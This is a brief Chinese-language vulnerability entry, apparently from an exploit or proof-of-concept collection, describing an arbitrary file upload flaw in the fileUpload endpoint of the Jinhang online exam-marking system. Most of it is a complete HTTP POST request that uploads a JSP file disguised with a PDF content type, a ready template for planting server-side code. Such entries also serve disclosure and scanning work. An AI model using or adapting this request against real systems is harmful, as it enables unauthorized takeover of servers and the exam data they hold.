**漏洞描述：**

金航网上阅卷系统 fileUpload 任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

**影响版本：**

金航网上阅卷系统

**Payload：**

```yaml
POST /fileUpload HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host:
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 351
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="upload"; filename="poc.jsp"
Content-Type: application/pdf

<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="uploadContentType"

pdf
--00content0boundary00
Content-Disposition: form-data; name="uploadFileName"

1.jsp
--00content0boundary00--
```

---
